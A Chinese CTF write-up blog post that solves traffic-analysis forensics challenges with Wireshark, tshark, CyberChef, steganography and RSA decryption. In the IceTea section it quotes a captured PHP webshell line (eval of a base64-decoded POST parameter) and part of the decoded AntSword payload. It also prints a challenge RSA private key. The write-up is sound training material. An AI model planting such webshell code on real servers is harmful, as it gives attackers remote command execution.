class="variable">$output</span>);</span><br></pre></td></tr></table></figure></div>

<p>在输出aac1c1之后的第一个输出应该是<code>cat /secret</code>的结果，拿到secret的内容<code>Y0UAr3G00D</code></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318193214019.png" alt="image-20240318193214019"></p>
<ul>
<li>flag为:<code>flag&#123;n3wst4r_www-data_Y0UAr3G00D&#125;</code></li>
</ul>
<blockquote>
<p>关于蚁剑流量可以查看：<a class="link" href="https://zhuanlan.zhihu.com/p/666225827">浅谈蚁剑流量分析 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h4 id="0x0B-DASCTF-X-BUUOJ-五月大联动-sseddoG"><a href="#0x0B-DASCTF-X-BUUOJ-五月大联动-sseddoG" class="headerlink" title="0x0B [DASCTF X BUUOJ 五月大联动]sseddoG"></a>0x0B [DASCTF X BUUOJ 五月大联动]sseddoG</h4><ul>
<li>套了流量分析壳的Crypto</li>
<li>过滤<code>http</code>后，看到两个文件：<code>Athena.png</code>和<code>Top_secret.zip</code>，把这两个文件导出</li>
<li>zip里面是一个dat，cat出来发现是一堆十六进制，先放着</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240319155751765.png" alt="image-20240319155751765"></p>
<ul>
<li>png先binwalk一下发现了里面有xml和pem证书文件，但是直接使用<code>binwalk -e</code>分离是提取不出来了，进入到<code>010editor</code>中手动提取，里面主要有一个public key和一个private key(其实是两个，但是重复了)，还有一个疑似flag，但是并不是</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4Ai</span><br><span class="line">nAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1</span><br><span class="line">mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMT</span><br><span class="line">DicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90h</span><br><span class="line">Tgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCb</span><br><span class="line">hdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOI</span><br><span class="line">pQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzI</span><br><span class="line">A9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/H</span><br><span class="line">DtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2td</span><br><span class="line">INtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzCly</span><br><span class="line">AYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7</span><br><span class="line">v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09f</span><br><span class="line">Tw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5</span><br><span class="line">ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2</span><br><span class="line">YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1J</span><br><span class="line">Gd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMU</span><br><span class="line">Ra592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje</span><br><span class="line">0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9R</span><br><span class="line">pJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQyk</span><br><span class="line">AH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzg</span><br><span class="line">OOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPc</span><br><span class="line">QzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwL</span><br><span class="line">uCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ</span><br><span class="line">9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQK</span><br><span class="line">kPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZa</span><br><span class="line">yPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG</span><br><span class="line">7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbh</span><br><span class="line">ZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7</span><br><span class="line">efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLK</span><br><span class="line">OLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiI</span><br><span class="line">F3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">&lt;FLAG?&gt;TheyWereBelieversInTheGoddess&lt;/FLAG?&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>接下来就要联想到crypto中的RSA，根据dat文件中的&lt;data&gt;和&lt;sign&gt;标签，可以推测，data里面的是密文，sign里面是签名</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="number">6945004599188163993695415369835695903301224003136994252560594956191090963121611565339316899123749651980866032846579298200421747380583546633355992903073674181349057044030322829788264132202636849376954935277228938532451604402772829242424577058024238656161078439246537271516326863255516855631753446705292842229626286876548916801469642547513456705866784202623394305276451128865785358297012288872815722144655832856702699498675579782594166664458814522864775862036884859354259378908758433643337060342583622920263235497780709801069090899910257671959718315799533292405361650450010152269010240983236777594133358567962307235569</span></span><br><span class="line">s = <span class="number">2657375403899004421682435875591648757169751001935445937761677813563331237751296771655965799410203548200444843121899114276425174188686046977514392352233441829494629361400810323413751538449142557000621910082199277027187814332458889139635831754705831808451385798544850324418189973193940364270700678684371080465070928269782397410454121628205746311654719735981174781630012234885865191874665887323338400055601894791632973447395440378983992188376105785566869556895986983889219094640854379267584790389009829385657891279182819588524435817909919666674804622368593843455996806164859962400637898116212711639490474051288221345806</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;client_secret.pem&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pk = RSA.importKey(f.read())</span><br><span class="line">m = <span class="built_in">pow</span>(c, pk.d, pk.n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">cc = <span class="built_in">pow</span>(s, pk.e, pk.n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(cc))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>[<a class="link" href="https://zhuanlan.zhihu.com/p/376338394">DASCTF X BUUOJ 五月大联动] 个人（or团队）writeup - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li>得到flag</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;9c24662f37e33ad7803ed43b740025b6&#125;</span><br></pre></td></tr></table></figure></div>

<p>flag{80,3306,5000,7000,8021,9000}</p>
<h4 id="0x0C-UTCTF2020-icmp-file-transfe"><a href="#0x0C-UTCTF2020-icmp-file-transfe" class="headerlink" title="0x0C [UTCTF2020]icmp-file-transfe"></a>0x0C [UTCTF2020]icmp-file-transfe</h4><ul>
<li>icmp流量分析，需要环境，我这里只做了提取pcap现有data</li>
<li>具体wp可移步：[<a class="link" href="https://www.cnblogs.com/yunqian2017/p/15022989.html">UTCTF2020]icmp-file-transfer - 云千 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="困难"><a href="#困难" class="headerlink" title="困难"></a>困难</h3><h4 id="0x01-蜘蛛侠呀"><a href="#0x01-蜘蛛侠呀" class="headerlink" title="0x01 蜘蛛侠呀"></a>0x01 蜘蛛侠呀</h4><ul>
<li><p>困难在 很难猜到后面的gif隐写</p>
</li>
<li><p>wireshark里面主要是icmp包，查看这些icmp，发现data里面类似base64编码，用tshark提取出来</p>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -nr &quot;out.pcap&quot; -Y &#x27;icmp.resp_to&#x27; -T fields -e &quot;data.data&quot;|xxd -r -p |sed &#x27;s/^.*\$//g&#x27; |awk &#x27;NR%2 == 0&#x27; &gt; zhishuxia_ssh.txt</span><br></pre></td></tr></table></figure></div>

<p><strong>-Y</strong> 过滤的是reply包，**-e** 提取data，<strong>xxd</strong>是把提取的hex解码，<strong>sed</strong>删除前面多余的<code>$$START$$</code>，取出来的消息每条有一个重复，利用<strong>awk</strong>每隔一行打印（NR为行号，模2为0实现每隔一行打印）</p>
<p><em>开头的—-BEGIN CERTIFICATE—–和结尾的end一开始让我以为是什么证书文件，对应数据包中也有ssh，以为是要通过证书解密ssh，发现在wireshark中ssh不支持这么做，尝试无果</em></p>
<ul>
<li>把多余的信息（certificate的标头和标尾）去除后，直接拿去base64解码，得到了一个zip文件</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314205235462.png" alt="image-20240314205235462"></p>
<ul>
<li>zip里面是一个<code>flag.gif</code>，开始gif隐写了，这里是时间轴隐写</li>
</ul>
<blockquote>
<p>关于gif隐写 <a class="link" href="https://ctf-wiki.org/misc/picture/gif/">GIF - CTF Wiki (ctf-wiki.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li><code>identify -format &quot;%T &quot; flag.gif </code>查看每一帧的时间间隔，发现是20和50交替</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314205812516.png" alt="image-20240314205812516"></p>
<ul>
<li>利用sed，把20转成0，50转成1；利用tr删除空格：<code>identify -format &quot;%T &quot; flag.gif | sed &#39;s/20/0/g&#39; | sed &#39;s/50/1/g&#39;|tr -d &#39; &#39;</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314210137379.png" alt="image-20240314210137379"></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">011011010100010000110101010111110011000101110100</span><br></pre></td></tr></table></figure></div>

<ul>
<li>cyberchef-from binary</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314210248126.png" alt="image-20240314210248126"></p>
<ul>
<li>flag为<code>mD5_1t</code> 经过md5后的密文，那么再加个md5</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240314210354365.png" alt="image-20240314210354365"></p>
<ul>
<li>包上flag:<code>flag&#123;f0f1003afe4ae8ce4aa8e8487a8ab3b6&#125;</code></li>
</ul>
<p><em>这道题，挺有意思的，卡在gif隐写，我不是很熟😭</em></p>
<h4 id="0x02-DASCTF-X-GFCTF-2022十月挑战赛！-ez-xxd"><a href="#0x02-DASCTF-X-GFCTF-2022十月挑战赛！-ez-xxd" class="headerlink" title="0x02 [DASCTF X GFCTF 2022十月挑战赛！]ez_xxd"></a>0x02 [DASCTF X GFCTF 2022十月挑战赛！]ez_xxd</h4><ul>
<li>其实没想好归于中等还是困难，还是归于困难吧，过程有点繁琐,,,,</li>
<li>过滤http，可以看到get了一个flag.txt，在wireshark中export objects导出http对象，可以看到里面有个<code>flag.txt</code>和<code>maybe_today.zip</code>，把这两个文件保存下来</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318130403634.png" alt="image-20240318130403634"></p>
<ul>
<li>zip有加密，先看flag.txt感觉是base64，交给cyberchef，发现解出来是一堆十六进制，结合题目xxd，再from hex一下，发现关键信息<code>IHDR</code>，推测是png格式，但貌似少了头</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318130547917.png" alt="image-20240318130547917"></p>
<ul>
<li>保存下来，打不开，需要把头补回去，在开头补上<code>89 50 4E 47 0D 0A 1A 0A</code>，再打开是一张这样的图片。<em>老二次元是不是可以直接看出来，哈哈，可惜我不是，我goole识图了一下，原来是<strong>初音未来</strong></em></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318130856858.png" alt="image-20240318130856858"></p>
<ul>
<li>简单检查了一下常见的png隐写，未发现任何隐写，转到zip，发现里面有一张<code>Miku.png</code>，大小也差不多，<code>bkrack -L maybe_today.zip</code>发现压缩算法是<code>ZipCrypto</code>，猜测是明文攻击，又到<code>bkcrarck</code>登场了。<em>在此之前记得把这张图片也以相同的ZipCrypto方式压缩在一个压缩包里</em>。</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318131029092.png" alt="image-20240318131029092"></p>
<ul>
<li>拿到key之后，直接用新的zip和密码替换</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318131306192.png" alt="image-20240318131306192"></p>
<ul>
<li>打开new.zip，<strong>仔细查看</strong>（我没仔细看，导致后面的压缩包不知道咋解），发现有两个可疑的地方，一个是有一个<code>flag</code>文件夹，里面放着一些mysql的文件，<code>js</code>文件夹里的SceneManager.js，里面有一句password，后面可能会用到</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318143039258.png" alt="image-20240318143039258"></p>
<p>这几个文件经过搜索为mysql的备份文件，经尝试，mysql8无法成功，使用mysql5的版本，可以用phpmyadmin直接新建一个flag数据库（新建数据库文件夹里会出现db.opt文件），接下来只需要把所有的文件复制进数据库文件夹里即可</p>
<blockquote>
<p> <a class="link" href="https://blog.harumonia.moe/sql-frm-myi-myd-files/">数据库中的.frm.myi.myd文件 | Zaxon (harumonia.moe) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318143512927.png" alt="image-20240318143512927"></p>
<p>SceneManager.js里的密码：<code>sWxSAnweQIES46L</code></p>
<ul>
<li>在phpmyadmin中恢复数据之后，能看见存了一个bin文件</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318143613753.png" alt="image-20240318143613753"></p>
<ul>
<li>把bin文件存下来，可以先cat几行，发现是base64，丢给cyberchef，发现解码后是个zip</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318143737926.png" alt="image-20240318143737926"></p>
<ul>
<li>存下来又是一个加密的zip，里面是一个flag.txt，尝试了伪加密之后，<em>（我卡在这了）</em>，想起之前的密码，解一下，发现flag.txt里面和题目很像，搜索发现是兽语加密，解密得到一串base64</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318144056039.png" alt="image-20240318144056039"></p>
<ul>
<li>cyberchef from base64 解码又是熟悉的十六进制，再from hex一下，拿到了flag：<code>dasctf&#123;l0ve_you_want_l0ve&#125;</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318144140365.png" alt="image-20240318144140365"></p>
<p><em>哎，我总是不仔细查所有文件，下意识以为用过一次就不会用了；有时每一步的尝试也并不透彻，导致陷入苦恼，其实离flag就差一点了，，，应该更仔细点的，，，，</em></p>
<h4 id="0x03-VNCTF2022公开赛-Strange-flag"><a href="#0x03-VNCTF2022公开赛-Strange-flag" class="headerlink" title="0x03 [VNCTF2022公开赛]Strange flag"></a>0x03 [VNCTF2022公开赛]Strange flag</h4><ul>
<li><p>流量分析部分很简单，然后就触到盲区了，<strong>esolang的一种叫Folders</strong>的语言</p>
</li>
<li><p>流量分析部分就是追踪一下post请求包，最后发现打印了tree flag/的结果</p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240318212151595.png" alt="image-20240318212151595"></p>
<p><em>如果你了解esolang这就是一道小型编程题，如果你不了解，这就是脑洞题</em></p>
<ul>
<li>利用python根据文本内容创建文件夹：</li>
</ul>
<blockquote>
<p><a class="link" href="https://note.tonycrane.cc/writeups/vnctf2022/">VNCTF 2022 - 鹤翔万里的笔记本 (tonycrane.cc) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    tree = f.readlines()</span><br><span class="line">path = Path(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">last_level = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> tree:</span><br><span class="line">    level = each.find(<span class="string">&quot;N&quot;</span>)//<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> level &lt; last_level:</span><br><span class="line">        path = path.parent</span><br><span class="line">    <span class="keyword">if</span> level == last_level:</span><br><span class="line">        path = path.parent</span><br><span class="line">    diff = last_level - level</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(diff):</span><br><span class="line">        path = path.parent</span><br><span class="line">    path = path / each.strip().replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    last_level = level</span><br><span class="line">    os.makedirs(path)</span><br></pre></td></tr></table></figure></div>

<p>Folders 有工具，pip install Folders，然后 Folders flag/，得到 flag：<code>vnctf&#123;d23903879df57503879bcdf1efc141fe&#125;</code></p>
<ul>
<li>脑洞</li>
</ul>
<blockquote>
<p><a class="link" href="https://blog.csdn.net/qq_74710163/article/details/129165017">VNCTF 2022 misc复现_vnctf2022misc-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>只看倒数第二级，原因大概是，是稳定的四个文件，通过无子文件夹（0），有子文件夹（1），生成01字符串，解码。</p>
<h4 id="0x04-SUCTF2019-protocol"><a href="#0x04-SUCTF2019-protocol" class="headerlink" title="0x04 [SUCTF2019]protocol"></a>0x04 [SUCTF2019]protocol</h4><ul>
<li>usb流量里面算难的了，所以放在了困难里</li>
<li>假flag是suctf{have_fun!}</li>
<li>发现usbhid.data里有<code>89504e</code>这串敏感数据（png头）猜测藏了png，用tshark 提取usbhid.data 存进txt，然后丢进cyberchef，导出为dat文件，foremost分离dat文件拿到很多图片：</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240320153421596.png" alt="image-20240320153421596"></p>
<ul>
<li>这些图片需要镜像一下，在文件夹下：<code>convert -flop *.png</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240320153746711.png" alt="image-20240320153746711"></p>
<ul>
<li>接下来我们需要知道这些字符的顺序，回到wireshark，按照length排序一下发现hiddata第二个字节在变化，tshark提取出来，通过<code>cut -c 3,4</code>提取第三个和第四个字符，也就是变化的那个字节</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240320161251397.png" alt="image-20240320161251397"></p>
<ul>
<li>观察到图片每15张字母图后面会有10张全黑图片，所以按照<code>15 10 15 10</code>的方式切割：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">04 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a</span><br><span class="line">06 07 0e 04 01 0d 00 02 0b 09</span><br><span class="line">04 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a</span><br><span class="line">01 0e 08 06 0d 0c 00 05 09 0b</span><br><span class="line">04 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a</span><br><span class="line">02 09 03 05 01 07 0d 0b 0e 04</span><br><span class="line">04 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a</span><br><span class="line">06 0d 0a 08 09 04 0b 03 0c 02</span><br><span class="line">04 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a </span><br></pre></td></tr></table></figure></div>

<p>发现15个的顺序都是<code>04 03 02 01 00 09 08 07 06 05 0e 0d 0c 0b 0a</code></p>
<ul>
<li>接下来需要一些<em>小脑洞</em>：10张黑色图片的信息就是15张字母图的信息的索引，例如06对应第一排第6个数据09，也就是第一排15张图片中的第9张，也就是字母<code>s</code>的图片。<em>其中有索引<code>00</code>这样的情况出现，这个只能根据字符串含义在剩余图片里猜猜了</em></li>
<li>按照这个规律拿到flag:<code>suctf&#123;My_usb_pr0toco1_s0_w3ak&#125;</code></li>
</ul>
<h4 id="0x05-XMAN2018排位赛-ppap"><a href="#0x05-XMAN2018排位赛-ppap" class="headerlink" title="0x05 [XMAN2018排位赛]ppap"></a>0x05 [XMAN2018排位赛]ppap</h4><ul>
<li>涉及到opencv</li>
<li>打开wireshark，按照length排序，追踪length最大的数据包所在的tcp流，发现了3段对话</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">yaaaaaaaar, land ho!Hey wesley, you got that flag?Ayy, I got yer files right here, matey!</span><br><span class="line">/9j...... jpg文件的base64</span><br><span class="line">-------------------------</span><br><span class="line">～～～～</span><br><span class="line">UEsD...... zip文件的base64</span><br><span class="line">-------------------------</span><br><span class="line">And here be the map to the booty!</span><br><span class="line">PD94bWwg...... xml文件的base64</span><br><span class="line">-------------------------</span><br><span class="line">I don&#x27;t understand, this isn&#x27;t even a ma-Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50! Lastly, if ye sail the seven seas, you do be a pirate!</span><br></pre></td></tr></table></figure></div>

<p>所以里面需要分离出三个文件jpg、zip和xml，需要仔细查看文件，很容易漏掉xml</p>
<ul>
<li>jpg文件可以分离出很多的jpg</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240320194626865.png" alt="image-20240320194626865"></p>
<ul>
<li>zip文件里面存了一个flag.txt，但是zip是加密的，需要密码</li>
<li>xml文件，里面有一个<opencv_storage>的标签</opencv_storage></li>
<li>接下来就又触碰到我的知识盲区了：opencv，暂时不打算研究这个怎么写，要根据对话中的提示设置scale和neighbors</li>
</ul>
<blockquote>
<p>代码复制的 [BUUCTF-MISC-<a class="link" href="https://blog.csdn.net/weixin_66146598/article/details/125152840">XMAN2018排位赛]ppap（详细解析）-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import cv2 </span><br><span class="line"># Get all of the pictures</span><br><span class="line">imgs = os.listdir(&#x27;/Users/madison/Desktop/output/jpg&#x27;) </span><br><span class="line"># Cascade we&#x27;ll be using for detection</span><br><span class="line">cascade = cv2.CascadeClassifier(&#x27;/Users/madison/Desktop/ppap.xml&#x27;) </span><br><span class="line"># From the clues</span><br><span class="line">scaling_factor = 1.02</span><br><span class="line">min_neighbors = 65  # Bumped this up until one pic was left</span><br><span class="line">for img_name in imgs:</span><br><span class="line">    # Load the image and run the cascade</span><br><span class="line">    img = cv2.imread(os.path.join(&#x27;/Users/madison/Desktop/output/jpg&#x27;, img_name)) </span><br><span class="line">    # print img</span><br><span class="line">    detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors)</span><br><span class="line">    if len(detect) &gt; 0:</span><br><span class="line">        print(&#x27;ok&#x27;)</span><br><span class="line">        for (x, y, w, h) in detect:</span><br><span class="line">            # X marks the spot!</span><br><span class="line">            cv2.line(img, (x, y),(x + w, y + h), (255, 0, 0), 2)</span><br><span class="line">            cv2.line(img, (x, y + h), (x + w, y),(255, 0, 0), 2)</span><br><span class="line">        # Save the new image</span><br><span class="line">        cv2.imwrite(os.path.join(&#x27;/Users/madison/Desktop/output&#x27;, img_name), img)</span><br></pre></td></tr></table></figure></div>

<p>扫完了拿到一张图</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240320201533236.png" alt="image-20240320201533236"></p>
<p>是这个骷髅头，英文名为 skullandcrossbones，就是zip的密码</p>
<p><em>看了别人的wp有人直接爆破出来了，但我没成功：<a class="link" href="https://passwordrecovery.io/zip-file-password-removal/">ZIP File Password Recovery Online | passwordrecovery.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p>
<ul>
<li>flag：<code>flag&#123;b31Ng_4_P1r4tE_1s_4lR1GHT_w1Th_M3&#125;</code></li>
</ul>
<hr>
<p><em>😭的确很难，其实写到这里，我已经在考虑是否这个系列还要更新下去了，因为感觉已经偏离了掌握分析流量技巧或wireshark/tshark使用的初心，后面做的题都偏向把流量分析当一个壳，实际的考点却是别的。</em></p>
<hr>
<h4 id="0x06-DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-IceTea"><a href="#0x06-DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-IceTea" class="headerlink" title="0x06 [DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]IceTea"></a>0x06 [DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]IceTea</h4><ul>
<li>蚁剑+逆向。这道题对于我来说是中等偏简单的（因为我偶尔做做rev，虽然很菜），但是想着对于不碰逆向的人来说，这也许有点困难？</li>
</ul>
<p><em>其实我打过这场比赛，但是当时对流量分析还不是很了解，所以不会做，看了wp之后也觉得很复杂，但现在做了很多流量分析题之后居然觉得还挺简单的？😄感受到了自己在流量分析上的进步。</em></p>
<ul>
<li>过滤一下http，很容易发现是蚁剑攻击流量，一共有四个post，我们需要关注这四个数据包所在的http流。</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321154345919.png" alt="image-20240321154345919"></p>
<p>**tcp.stream eq 0:*<em>主要由一段16进制和base64组成，</em>这个流重点讲讲，后面的流依葫芦画瓢*</p>
<p>16进制解hex是一个elf文件，DIE看一下发现加了UPX壳，需要先使用<code>upx -d </code>，解壳</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321151532016.png" alt="image-20240321151532016"></p>
<p>解壳之后 ida64打开，发现是一个base64换表编码的函数：</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321162530769.png" alt="image-20240321162530769"></p>
<p><strong>shift+f12可以看见表</strong>：<code>    abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/</code>，a点进去可以看见，先留着。</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321162554320.png" alt="image-20240321162554320"></p>
<p><em>因为第一行中的：<code>cmd=%40eval(%40base64_decode(%24_POST%5B&#39;gca74cf27602f7&#39;%5D))</code>urldecode之后很容易知道，代码的意思就是运行这个参数base64解码后的代码，<code>gca74cf27602f7</code>是参数名</em></p>
<p>base64的部分就是php代码了，注意要去掉参数的名称部分，例如这里去掉前缀<code>gca74cf27602f7=</code>，同时去掉后面的参数</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240321153102628.png" alt="image-20240321153102628"></p>
<p>只base64解码参数<code>gca74cf27602f7=</code>的值（QGlu…），得到这样的代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);<span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;<span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span 